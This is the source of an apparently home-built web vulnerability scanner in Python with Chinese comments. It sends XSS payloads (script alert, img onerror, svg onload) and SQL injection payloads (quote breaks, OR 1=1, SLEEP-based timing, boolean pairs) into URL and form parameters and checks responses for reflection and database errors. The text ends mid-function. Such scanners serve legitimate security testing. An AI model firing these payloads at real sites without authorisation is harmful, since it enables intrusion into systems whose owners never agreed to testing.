#                             test_data = data.copy() if data else {}
#                             test_data[param_name] = payload
                            
#                             request_info = {
#                                 'method': 'POST',
#                                 'url': url.split('?')[0],  # 移除查询参数
#                                 'headers': headers or {},
#                                 'data': test_data,
#                                 'cookies': cookies or {}
#                             }
#                         else:
#                             # 对于GET请求，将payload注入到URL参数中
#                             if url_params:
#                                 # 替换特定参数
#                                 test_params_copy = url_params.copy()
#                                 test_params_copy[param_name] = payload
                                
#                                 # 重建URL
#                                 parsed = urlparse(url)
#                                 query_string = '&'.join([f"{k}={v}" for k, v in test_params_copy.items()])
#                                 test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"
#                             else:
#                                 # 没有原始参数，添加新参数
#                                 test_url = f"{url}?{param_name}={payload}"
                            
#                             request_info = {
#                                 'method': 'GET',
#                                 'url': test_url,
#                                 'headers': headers or {},
#                                 'cookies': cookies or {}
#                             }
                        
#                         print(f"  [>] 测试payload #{payload_idx+1}: {payload[:50]}...")
                        
#                         # 发送请求
#                         response = self.send_controlled_request(request_info)
                        
#                         if response is None:
#                             print(f"  [-] 请求失败: {url}")
#                             continue
                        
#                         # 检查响应
#                         response_text = response.get('response', {}).get('text', '')
                        
#                         # 检测XSS漏洞
#                         is_vulnerable, confidence, details = self._detect_xss_in_response(
#                             response_text, payload, original_value
#                         )
                        
#                         if is_vulnerable:
#                             vuln_info = {
#                                 "url": url,
#                                 "type": "反射型XSS",
#                                 "parameter": param_name,
#                                 "payload": payload,
#                                 "confidence": confidence,
#                                 "method": method,
#                                 "details": details,
#                                 "response_code": response.get('response', {}).get('status_code'),
#                                 "tested_url": request_info.get('url') if method.upper() == 'GET' else url
#                             }
                            
#                             # 如果是POST请求，添加注入的数据
#                             if method.upper() == 'POST':
#                                 vuln_info["injected_data"] = request_info.get('data')
                            
#                             vulnerabilities.append(vuln_info)
                            
#                             print(f"  [!] 发现XSS漏洞！置信度: {confidence}")
#                             print(f"      详情: {details}")
                            
#                             # 高置信度的漏洞不再测试更多payload
#                             if confidence == "高":
#                                 break
                    
#                     except Exception as e:
#                         print(f"  [-] 测试参数 {param_name} 时出错: {e}")
#                         continue
            
#             # 测试存储型XSS（基础检测）
#             if method.upper() == 'POST' and data:
#                 print(f"\n[*] 开始存储型XSS检测...")
#                 for payload in self.xss_payloads[:5]:  # 只测试前5个payload
#                     try:
#                         # 注入payload
#                         test_data = data.copy()
#                         for key in test_data.keys():
#                             if isinstance(test_data[key], str):
#                                 test_data[key] = payload
                        
#                         # 发送POST请求（提交数据）
#                         request_info = {
#                             'method': 'POST',
#                             'url': url,
#                             'headers': headers or {},
#                             'data': test_data,
#                             'cookies': cookies or {}
#                         }
                        
#                         response = self.send_controlled_request(request_info)
                        
#                         if response and response.get('response', {}).get('status_code') in [200, 302]:
#                             print(f"  [>] 已提交存储型XSS payload: {payload[:30]}...")
                            
#                             # 稍等片刻后重新访问页面查看是否存储
#                             time.sleep(1)
                            
#                             # 重新访问页面
#                             get_request_info = {
#                                 'method': 'GET',
#                                 'url': url,
#                                 'headers': headers or {},
#                                 'cookies': cookies or {}
#                             }
                            
#                             get_response = self.send_controlled_request(get_request_info)
                            
#                             if get_response:
#                                 response_text = get_response.get('response', {}).get('text', '')
#                                 if payload.lower() in response_text.lower():
#                                     vulnerabilities.append({
#                                         "url": url,
#                                         "type": "存储型XSS",
#                                         "payload": payload,
#                                         "confidence": "中",
#                                         "details": "payload在后续访问中仍然存在",
#                                         "method": "POST->GET"
#                                     })
#                                     print(f"  [!] 可能发现存储型XSS漏洞！")
                    
#                     except Exception as e:
#                         print(f"  [-] 存储型XSS测试出错: {e}")
        
#         # 统计结果
#         print(f"\n{'='*60}")
#         print(f"扫描完成！共发现 {len(vulnerabilities)} 个XSS漏洞")
        
#         # 按置信度排序
#         vulnerabilities.sort(key=lambda x: {"高": 0, "中": 1, "低": 2}[x.get("confidence", "低")])
        
#         # 输出详细结果
#         for i, vuln in enumerate(vulnerabilities, 1):
#             print(f"\n漏洞 #{i}:")
#             print(f"  类型: {vuln['type']}")
#             print(f"  URL: {vuln['url']}")
#             print(f"  参数: {vuln.get('parameter', 'N/A')}")
#             print(f"  方法: {vuln.get('method', 'GET')}")
#             print(f"  置信度: {vuln['confidence']}")
#             print(f"  详情: {vuln['details']}")
        
#         # 更新扫描结果
#         self.results['vulnerabilities'].extend(vulnerabilities)
        
#         return vulnerabilities, self.results 

#     def check_dom_xss(self, url_input):
#         """DOM型XSS检测（需要JavaScript执行环境，这里为基础检测）"""
#         print("\n[*] 开始DOM型XSS检测...")
        
#         vulnerabilities = []
        
#         # DOM XSS相关payload
#         dom_payloads = [
#             "#<script>alert('DOM XSS')</script>",
#             "#javascript:alert('DOM XSS')",
#             "?param=123#<img src=x onerror=alert(1)>",
#             "?returnUrl=javascript:alert('XSS')",
#             "?callback=alert('XSS')"
#         ]
        
#         if isinstance(url_input, str):
#             urls = [url_input]
#         elif isinstance(url_input, list):
#             urls = url_input
#         else:
#             raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
#         for url in urls:
#             for payload in dom_payloads:
#                 try:
#                     # 构建测试URL
#                     if payload.startswith('#'):
#                         test_url = f"{url}{payload}"
#                     elif payload.startswith('?'):
#                         test_url = f"{url}{payload}"
#                     else:
#                         test_url = f"{url}?{payload}"
                    
#                     request_info = {
#                         'method': 'GET',
#                         'url': test_url,
#                         'headers': {}
#                     }
                    
#                     response = self.send_controlled_request(request_info)
                    
#                     if response:
#                         # 检查响应中是否有JavaScript处理痕迹
#                         response_text = response.get('response', {}).get('text', '')
                        
#                         # 查找可能的DOM操作
#                         dom_indicators = [
#                             'document.write',
#                             'innerHTML',
#                             'eval(',
#                             'setTimeout',
#                             'location.hash',
#                             'window.location'
#                         ]
                        
#                         for indicator in dom_indicators:
#                             if indicator in response_text:
#                                 vulnerabilities.append({
#                                     "url": url,
#                                     "type": "可能的DOM型XSS",
#                                     "payload": payload,
#                                     "confidence": "低",
#                                     "details": f"发现DOM操作函数: {indicator}",
#                                     "tested_url": test_url
#                                 })
#                                 print(f"  [!] 发现可能的DOM XSS漏洞，使用了 {indicator}")
#                                 break
                
#                 except Exception as e:
#                     print(f"  [-] DOM XSS测试出错: {e}")
        
#         # 更新扫描结果
#         self.results['vulnerabilities'].extend(vulnerabilities)
        
#         return vulnerabilities,self.results

#     # def save_results(self, filename=None):
#     #     """保存扫描结果到文件"""
#     #     if not filename:
#     #         timestamp = time.strftime("%Y%m%d_%H%M%S")
#     #         filename = f"xss_scan_results_{timestamp}.json"
        
#     #     try:
#     #         with open(filename, 'w', encoding='utf-8') as f:
#     #             # 转换结果以便序列化
#     #             serializable_results = self.results.copy()
                
#     #             # 确保所有数据可序列化
#     #             def make_serializable(obj):
#     #                 if isinstance(obj, dict):
#     #                     return {k: make_serializable(v) for k, v in obj.items()}
#     #                 elif isinstance(obj, list):
#     #                     return [make_serializable(item) for item in obj]
#     #                 elif hasattr(obj, '__dict__'):
#     #                     return str(obj)
#     #                 else:
#     #                     return obj
                
#     #             serializable_results = make_serializable(serializable_results)
                
#     #             json.dump(serializable_results, f, indent=2, ensure_ascii=False)
            
#     #         print(f"[+] 结果已保存到: {filename}")
#     #         return filename
        
#     #     except Exception as e:
#     #         print(f"[-] 保存结果失败: {e}")
#     #         return None
    
#     # def check_xss(self, url_input):
#     #     """ XSS扫描"""
#     #     # testpayloads=[
#     #     #     "<script>alert('XSS')</script>",
#     #     #     "\"><script>alert('XSS')</script>",
#     #     #     "'><script>alert('XSS')</script>",
#     #     # ]
#     #     testpayloads=load_xss_payload()

#     #     vulnerabilities=[]

#     #      # 统一处理输入：将单个URL转换为列表
#     #     if isinstance(url_input, str):
#     #         urls = [url_input]
#     #     elif isinstance(url_input, list):
#     #         urls = url_input
#     #     else:
#     #         raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")
        
#     #     for url in urls:
#     #          # 确保URL是字符串
#     #         if not isinstance(url, str):
#     #             print(f"跳过非字符串URL: {url}")
#     #             continue
            
#     #         print(f"\n开始测试URL: {url}")

#     #         for payload in testpayloads:
#     #             try:
#     #                 test_url=f"{url}?test={payload}"
#     #                 print(test_url)
#     #                 if test_url:
#     #                     request_info={
#     #                         'method' : 'GET',
#     #                         'url':test_url,
#     #                         'headers':{}
#     #                     }
#     #                 response=self.send_controlled_request(request_info)
#     #                 if response is None:
#     #                 # 修复logger调用 - 根据你的实际logger结构调整
#     #                     if hasattr(self.logger, 'error'):
#     #                         self.logger.error(f"请求失败，响应为None: {url}")
#     #                     elif isinstance(self.logger, dict) and 'error_logger' in self.logger:
#     #                         self.logger['error_logger'].error(f"请求失败，响应为None: {url}")
#     #                     else:
#     #                         print(f"请求失败，响应为None: {url}")
#     #                     continue
                
#     #                 # 检查解析的内容是否存在
#     #                 if 'parsed' not in response:
#     #                     error_msg = f"响应中没有parsed字段: {url}"
#     #                     if hasattr(self.logger, 'error'):
#     #                         self.logger.error(error_msg)
#     #                     else:
#     #                         print(error_msg)
#     #                     continue
#     #                 body=response['parsed']

#     #                 # response=self.session.get(test_url,timeout=5)#修改成包，利用受控制的请求发包
#     #                 if payload in str(body).lower():
#     #                     vulnerabilities.append({
#     #                         "type":"反射型XSS",
#     #                         "payload":payload,
#     #                         "confidence":"低"
#     #                     })
                        
#     #             except requests.exceptions.RequestException as e:
#     #                 print(f"请求错误: {e}")
#     #                 continue
#     #     scan_results=self.results
#     #     return vulnerabilities,scan_results

#     def crawl_links(self, url_input):
#         """爬取页面中的链接"""

#          # 统一处理输入：将单个URL转换为列表
#         if isinstance(url_input, str):
#             urls = [url_input]
#         elif isinstance(url_input, list):
#             urls = url_input
#         else:
#             raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")

#         for url in urls:
#             # 确保URL是字符串
#             if not isinstance(url, str):
#                 print(f"跳过非字符串URL: {url}")
#                 continue
            
#             print(f"\n开始测试URL: {url}")
#             try:
#                 if url:
#                     request_info={
#                         'method' : 'GET',
#                         'url':url,
#                         'headers':{}
#                     }
#                 response=self.send_controlled_request(request_info)
#                 # 检查响应是否为None（请求失败）
#                 if response is None:
#                     # 修复logger调用 - 根据你的实际logger结构调整
#                     if hasattr(self.logger, 'error'):
#                         self.logger.error(f"请求失败，响应为None: {url}")
#                     elif isinstance(self.logger, dict) and 'error_logger' in self.logger:
#                         self.logger['error_logger'].error(f"请求失败，响应为None: {url}")
#                     else:
#                         print(f"请求失败，响应为None: {url}")
#                     continue
                
#                 # 检查解析的内容是否存在
#                 if 'parsed' not in response:
#                     error_msg = f"响应中没有parsed字段: {url}"
#                     if hasattr(self.logger, 'error'):
#                         self.logger.error(error_msg)
#                     elif isinstance(self.logger, dict) and 'error_logger' in self.logger:
#                         self.logger['error_logger'].error(error_msg)
#                     else:
#                         print(error_msg)
#                     continue
#                 # response=self.session.get(url,timeout=10)#修改成包，利用受控制的请求发包
#                 body=response['parsed']['parsed_content']
#                 #print(body)
#                 soup=BeautifulSoup(str(body),"html.parser")
#                 #print(soup)

#                 # 解析基础URL的域名
#                 base_domain = urlparse(url).netloc
#                 links=[]
#                 try:
#                     if soup:
#                         for link in soup.find_all("a",href=True):
#                             href=link['href']
#                             # 解析链接的域名
#                             absolute_url=urljoin(url,href)
#                             link_domain = urlparse(absolute_url).netloc                
#                             # 只爬取同域名链接（忽略协议差异）
#                             if link_domain == base_domain:
#                                 links.append(absolute_url)
#                     return list(set(links)) #去重
#                 except Exception as e:
#                     self.logger.error(f"解析页面失败: {url}, 错误: {e}")
#             except Exception as e:
#                 if self.logger is None:
#                     print("日志对象未初始化！")
#                 else:
#                     self.logger.error(f"爬取链接失败: {url}, 错误: {e}")
#         return []
            
        



import time
import requests
import hashlib
import logging
import sys
import os
import re
import json
from urllib.parse import quote, unquote, urlparse, parse_qs, urljoin, urlunparse, urlencode
from bs4 import BeautifulSoup

# 导入模块（假设模块结构不变）
try:
    from modules.request_manager import RateLimiter
    from modules.request_queue import RequestQueueManager
    from modules.request_sender import RequestSender
    from modules.request_builder import RequestBuilder
    from modules.response_parse import ResponseParse
    from utils import load_config, load_xss_payload,load_sqli_config
except ImportError as e:
    print(f"导入模块失败: {e}")

class sampilescanner:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/115.0"
        })
        
        # 获取日志记录器
        self.logger = logging.getLogger('vuln_scanner.scan.port')

        # 加载SQL注入配置文件
        self.sql_config = load_sqli_config()
        
        # 初始化速率限制器
        self.rate_limiter = RateLimiter(
            max_requests_per_second=self.config.get("max_requests_per_second", 10),
            max_requests_per_minute=self.config.get("max_requests_per_minute", 60)
        )
        
        # 初始化请求队列
        self.request_queue = RequestQueueManager(
            max_concurrent=self.config.get("max_concurrent_requests", 5),
            max_queue_size=self.config.get("max_queue_size", 100),
            rate_limiter=self.rate_limiter
        )
        
        # 初始化请求发送器
        self.request_sender = RequestSender(
            timeout=self.config.get("request_timeout", 10),
            verify_ssl=self.config.get("verify_ssl", False),
            user_agent=self.config.get("user_agent"),
            proxies=self.config.get("proxies"),
            max_retries=self.config.get("max_retries", 3)
        )

        # 初始化请求构造器和响应解析器
        self.request_builder = RequestBuilder()
        self.response_parser = ResponseParse()

        # XSS检测配置
        self.xss_payloads = load_xss_payload() if 'load_xss_payload' in globals() else self._get_default_xss_payloads()
        self.xss_indicators = [
            "<script>alert", "<script>confirm", "<script>prompt",
            "javascript:", "onerror=", "onload=", "onclick=", "onmouseover=",
            "<svg/onload=", "<img src=x onerror=", "<body onload=", "<iframe src="
        ]
        
        # 基准响应存储（用于布尔盲注对比）
        self.baseline_responses = {}
        
        # 预构建的SQL注入payload集合
        self.sql_payloads = self._build_sql_payloads()
        
        # 结果存储
        self.results = {
            "requests": [],
            "responses": [],
            "statistics": {},
            'vulnerabilities': [],
            'sql_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_type": {},
                "by_database": {},
                "by_method": {}
            }
        }
        
        # SQL注入检测阈值配置
        self.sql_thresholds = {
            "time_based_threshold": self.sql_config.get("time_based_threshold", 3.0),
            "response_similarity_threshold": 0.7,
            "length_variation_threshold": 0.3
        }

    # def load_sql_config(self, config_file):
    #     """加载SQL注入配置文件"""
    #     try:
    #         with open(config_file, 'r', encoding='utf-8') as f:
    #             config = json.load(f)
    #             print(f"✅ 成功加载SQL注入配置文件: {config_file}")
    #             return config
    #     except FileNotFoundError:
    #         print(f"⚠️  配置文件 {config_file} 未找到，使用默认配置")
    #         return self._get_default_sql_config()
    #     except json.JSONDecodeError as e:
    #         print(f"❌ 配置文件 {config_file} JSON格式错误: {e}")
    #         return self._get_default_sql_config()
    #     except Exception as e:
    #         print(f"❌ 加载配置文件失败: {e}")
    #         return self._get_default_sql_config()

    def _get_default_xss_payloads(self):
        """默认XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]

    def _get_default_sql_config(self):
        """默认SQL注入配置"""
        return {
            "time_based_threshold": 3.0,
            "payloads": {
                "generic_error_based": ["'", "\"", "' OR '1'='1"],
                "mysql_specific": {
                    "error_based": ["' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --"],
                    "boolean_based": ["' AND 1=1 --"],
                    "time_based": ["' AND SLEEP(5) --"]
                }
            },
            "error_indicators": {
                "mysql": ["you have an error in your sql syntax", "warning: mysql"],
                "mssql": ["unclosed quotation mark", "sql server"],
                "postgresql": ["postgresql error"],
                "oracle": ["ora-"]
            },
            "boolean_indicators": {
                "true_indicators": ["welcome", "success", "exists"],
                "false_indicators": ["error", "invalid", "not found"]
            }
        }

    def _build_sql_payloads(self):
        """从配置文件构建SQL注入payload集合"""
        payloads = {
            "error_based": [],
            "boolean_based": [],
            "time_based": [],
            "union_based": [],
            "stacked": [],
            "oob": [],
            "comment_based": [],
            "second_order": []
        }
        
        config_payloads = self.sql_config.get("payloads", {})
        
        # 通用错误型payload
        if "generic_error_based" in config_payloads:
            for payload in config_payloads["generic_error_based"]:
                payloads["error_based"].append({"payload": payload, "database": "generic", "type": "error"})
        
        # 注释型payload
        if "comment_based" in config_payloads:
            for payload in config_payloads["comment_based"]:
                payloads["comment_based"].append({"payload": payload, "database": "generic", "type": "comment"})
        
        # DNS外带payload
        if "dns_exfiltration" in config_payloads:
            for payload in config_payloads["dns_exfiltration"]:
                payloads["oob"].append({"payload": payload, "database": "generic", "type": "oob"})
        
        # 数据库特定payload
        db_types = ["mysql_specific", "mssql_specific", "postgresql_specific", "oracle_specific"]
        
        for db_type in db_types:
            if db_type in config_payloads:
                db_name = db_type.replace("_specific", "")
                
                # 错误型payload
                if "error_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["error_based"]:
                        payloads["error_based"].append({"payload": payload, "database": db_name, "type": "error"})
                
                # 布尔型payload
                if "boolean_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["boolean_based"]:
                        payloads["boolean_based"].append({"payload": payload, "database": db_name, "type": "boolean"})
                
                # 时间型payload
                if "time_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["time_based"]:
                        payloads["time_based"].append({"payload": payload, "database": db_name, "type": "time"})
                
                # 联合查询payload
                if "union_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["union_based"]:
                        payloads["union_based"].append({"payload": payload, "database": db_name, "type": "union"})
                
                # 堆叠查询payload (MSSQL)
                if db_name == "mssql" and "stacked_queries" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["stacked_queries"]:
                        payloads["stacked"].append({"payload": payload, "database": db_name, "type": "stacked"})
                
                # 命令执行payload (MSSQL)
                if db_name == "mssql" and "command_execution" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["command_execution"]:
                        payloads["stacked"].append({"payload": payload, "database": db_name, "type": "command"})
        
        # 带外数据payload
        if "oob_out_of_band" in config_payloads:
            for payload in config_payloads["oob_out_of_band"]:
                payloads["oob"].append({"payload": payload, "database": "generic", "type": "oob"})
        
        # 二阶注入payload
        if "second_order_injection" in config_payloads:
            for payload in config_payloads["second_order_injection"]:
                payloads["second_order"].append({"payload": payload, "database": "generic", "type": "second_order"})
        
        # 混合payload
        if "hybrid_payloads" in config_payloads:
            for payload in config_payloads["hybrid_payloads"]:
                payloads["error_based"].append({"payload": payload, "database": "generic", "type": "hybrid"})
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _collect_statistics(self):
        """收集统计信息"""
        self.results['statistics'] = {
            'request_stats': self.request_sender.get_statistics() if hasattr(self.request_sender, 'get_statistics') else {},
            'queue_stats': self.request_queue.get_statistics() if hasattr(self.request_queue, 'get_statistics') else {},
            'rate_limit_stats': self.rate_limiter.get_stats() if hasattr(self.rate_limiter, 'get_stats') else {},
            'scan_duration': f"{time.time():.2f}s"
        }

    def send_controlled_request(self, request_info):
        """发送受控制的请求"""
        def _make_request():
            method = request_info.get('method', 'GET')
            url = request_info.get('url')

            if not url:
                raise ValueError("请求URL不能为空")

            # 发送请求
            response = self.request_sender.send_request(
                method=method,
                url=url,
                params=request_info.get('params'),
                data=request_info.get('data'),
                json_data=request_info.get('json'),
                headers=request_info.get('headers'),
                cookies=request_info.get('cookies'),
                allow_redirects=request_info.get('allow_redirects', True)
            )

            # 确保响应文本是字符串
            response_text = response.text
            if not isinstance(response_text, str):
                if response_text is None:
                    response_text = ''
                else:
                    response_text = str(response_text)

            # 确保响应内容长度是整数
            content_length = len(response.content) if hasattr(response, 'content') else 0

            # 解析响应
            parsed_response = {}
            if hasattr(self.response_parser, 'parse_response'):
                try:
                    parsed_response = self.response_parser.parse_response(
                        response,
                        extract_links=True,
                        extract_forms=True,
                        base_url=url
                    )
                except Exception as e:
                    print(f"解析响应时出错: {e}")
                    parsed_response = {}

            return {
                'request': request_info,
                'response': {
                    'status_code': response.status_code if hasattr(response, 'status_code') else 0,
                    'url': str(response.url) if hasattr(response, 'url') else url,
                    'headers': dict(response.headers) if hasattr(response, 'headers') else {},
                    'text': response_text,
                    'content': response_text,
                    'content_length': content_length
                },
                'parsed': parsed_response
            }

        # 提交到队列
        task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"

        self.request_queue.submit(task_id, _make_request)

        # 等待结果
        try:
            result = self.request_queue.get_result(task_id, timeout=30)

            # 记录结果
            self._record_request_result(result)

            return result

        except Exception as e:
            self.logger.error(f"请求失败: {request_info.get('url')} - {e}") if self.logger else print(f"请求失败: {request_info.get('url')} - {e}")
            return None

    def _record_request_result(self, result):
        """记录请求结果"""
        if not result:
            return
        
        self.results['requests'].append(result['request'])
        self.results['responses'].append(result['response'])
        self._collect_statistics()

    # ==================== SQL注入检测增强方法 ====================
    
    def get_baseline_response(self, url, param_name, param_value, method, post_data):
        """获取基准响应"""
        baseline_key = f"{url}_{param_name}_{method}"

        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]

        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }

            if method.upper() == "GET":
                # 构建带参数的URL
                parsed_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = parsed_url
            else:
                # POST请求
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                # 安全地处理响应内容，确保是字符串
                response_data = response['response']
                content = response_data.get('content', '')
                content_length = response_data.get('content_length', 0)
                status_code = response_data.get('status_code', 0)
                headers = response_data.get('headers', {})

                # 确保content是字符串
                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                baseline = {
                    'content': content,
                    'length': content_length,
                    'status': status_code,
                    'time': 0,
                    'headers': headers,
                    'hash': hashlib.md5(content.encode()).hexdigest() if content else ''
                }

                self.baseline_responses[baseline_key] = baseline
                return baseline

        except Exception as e:
            print(f"获取基准响应失败: {e}")
            import traceback
            traceback.print_exc()

        return None

    def _build_url_with_param(self, url, param_name, value):
        """构建带参数的URL"""
        # 确保url是字符串
        if not isinstance(url, str):
            if isinstance(url, list):
                print(f"⚠️  _build_url_with_param: url参数是列表，使用第一个元素")
                url = url[0] if url else ""
            else:
                url = str(url)

        # 如果url为空，返回空字符串
        if not url:
            return ""

        try:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param_name] = [value]

            new_query = urlencode(query_dict, doseq=True)
            return parsed._replace(query=new_query).geturl()
        except Exception as e:
            print(f"❌ 构建URL参数失败: {e}")
            # 如果解析失败，尝试简单拼接
            if '?' in url:
                return f"{url}&{param_name}={value}"
            else:
                return f"{url}?{param_name}={value}"

    # ==================== 基于错误的注入检测 ====================
    def detect_error_based(self, url, param_name, param_value, method, post_data, baseline):
        """基于错误的SQL注入检测 - 使用配置文件payload"""
        # 确保url是字符串
        if not isinstance(url, str):
            if isinstance(url, list):
                url = url[0] if url else ""
            else:
                url = str(url)

        error_payloads = self.sql_payloads.get("error_based", [])

        for payload_info in error_payloads:
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")

            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }

                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    if not test_url:  # 如果构建URL失败，跳过
                        continue
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data

                response = self.send_controlled_request(request_info)

                if response and 'response' in response:
                    # 确保响应内容是字符串
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content) if content is not None else ''

                    # 检查响应中是否包含数据库错误信息
                    error_found = self._check_for_database_errors(content)

                    if error_found:
                        return {
                            'type': 'Error-Based SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            #'confidence': 'High',
                            'confidence': '高',
                            'evidence': error_found[:200],
                            'response_code': response['response'].get('status_code', 0),
                            'response_length': len(content),
                            'technique': 'Error message disclosure'
                        }

            except Exception as e:
                # 不再打印每个payload的详细错误，只记录一次
                continue
            
        # 如果没有使用配置payload检测到，使用简单payload再试一次
        simple_payloads = ["'", "\"", "' OR '1'='1"]
        for payload in simple_payloads:
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }

                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    if not test_url:  # 如果构建URL失败，跳过
                        continue
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data

                response = self.send_controlled_request(request_info)

                if response and 'response' in response:
                    # 确保响应内容是字符串
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content) if content is not None else ''

                    error_found = self._check_for_database_errors(content)

                    if error_found:
                        return {
                            'type': 'Error-Based SQL Injection',
                            'payload': payload,
                            'database': 'generic',
                            'confidence': 'High',
                            'evidence': error_found[:200],
                            'response_code': response['response'].get('status_code', 0),
                            'response_length': len(content),
                            'technique': 'Error message disclosure'
                        }

            except Exception as e:
                continue
            
        return None
    
    def _ensure_string_url(self, url_input):
        """确保URL是字符串类型"""
        if isinstance(url_input, str):
            return url_input
        elif isinstance(url_input, list):
            if url_input:
                return str(url_input[0])
            else:
                return ""
        elif url_input is None:
            return ""
        else:
            return str(url_input)

    def _check_for_database_errors(self, response_text):
        """检查响应中的数据库错误信息 - 使用配置文件中的错误指示器"""
        # 确保response_text是字符串
        if not isinstance(response_text, str):
            if response_text is None:
                response_text = ''
            else:
                response_text = str(response_text)

        # 首先检查配置文件中的错误指示器
        error_indicators = self.sql_config.get("error_indicators", {})

        # 检查通用错误指示器
        if "generic" in error_indicators:
            for indicator in error_indicators["generic"]:
                if indicator.lower() in response_text.lower():
                    return f"Generic SQL error: {indicator}"

        # 检查特定数据库错误指示器
        db_types = ["mysql", "mssql", "postgresql", "oracle", "sqlite"]
        for db_type in db_types:
            if db_type in error_indicators:
                for indicator in error_indicators[db_type]:
                    if indicator.lower() in response_text.lower():
                        return f"{db_type.upper()} error: {indicator}"

        # 如果配置文件没有找到，使用内置模式
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"SQLite/JDBCDriver",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"SQL Server.*Driver",
            r"Msg \d+, Level \d+, State \d+",
            r"Unclosed quotation mark",
            r"Syntax error.*SQL",
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"PostgreSQL query failed"
        ]

        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)

        return None

    # ==================== 布尔盲注检测 ====================
    def detect_boolean_based(self, url, param_name, param_value, method, post_data, baseline):
        """布尔盲注检测 - 使用配置文件payload"""
        if not baseline:
            return None
        
        boolean_payloads = self.sql_payloads.get("boolean_based", [])
        
        if not boolean_payloads:
            # 如果没有配置的布尔payload，使用默认的
            true_payloads = ["' AND '1'='1", "' AND 1=1", "' OR 1=1--"]
            false_payloads = ["' AND '1'='2", "' AND 1=2", "' OR 1=2--"]
        else:
            # 使用配置文件中的payload，分别测试真/假条件
            true_payloads = []
            false_payloads = []
            for payload_info in boolean_payloads:
                payload = payload_info.get("payload", "")
                # 简单判断：包含"1=1"的为真条件，包含"1=2"的为假条件
                if "1=1" in payload or "'1'='1" in payload:
                    true_payloads.append(payload)
                elif "1=2" in payload or "'1'='2" in payload:
                    false_payloads.append(payload)
        
        # 如果没有区分出真/假payload，全部当作真条件测试
        if not true_payloads and boolean_payloads:
            true_payloads = [p.get("payload", "") for p in boolean_payloads[:3]]
        
        # 测试真条件
        true_response = None
        for payload in true_payloads[:3]:  # 只测试前3个
            true_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if true_response:
                break
        
        # 测试假条件
        false_response = None
        for payload in false_payloads[:3]:  # 只测试前3个
            false_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if false_response:
                break
        
        if true_response and false_response:
            # 对比响应差异
            similarity_with_true = self._calculate_similarity(
                baseline['content'], true_response['content']
            )
            similarity_with_false = self._calculate_similarity(
                baseline['content'], false_response['content']
            )
            
            # 布尔盲注特征：真条件与基准相似，假条件与基准不同
            if (similarity_with_true > self.sql_thresholds['response_similarity_threshold'] and 
                similarity_with_false < self.sql_thresholds['response_similarity_threshold']):
                
                # 进一步验证：检查内容长度差异
                length_diff_true = abs(baseline['length'] - true_response['length']) / baseline['length'] if baseline['length'] > 0 else 0
                length_diff_false = abs(baseline['length'] - false_response['length']) / baseline['length'] if baseline['length'] > 0 else 0
                
                if length_diff_false > length_diff_true * 2:  # 假条件响应有明显差异
                    return {
                        'type': 'Boolean-Based Blind SQL Injection',
                        #'confidence': 'Medium-High',
                        'confidence': '中',
                        'evidence': {
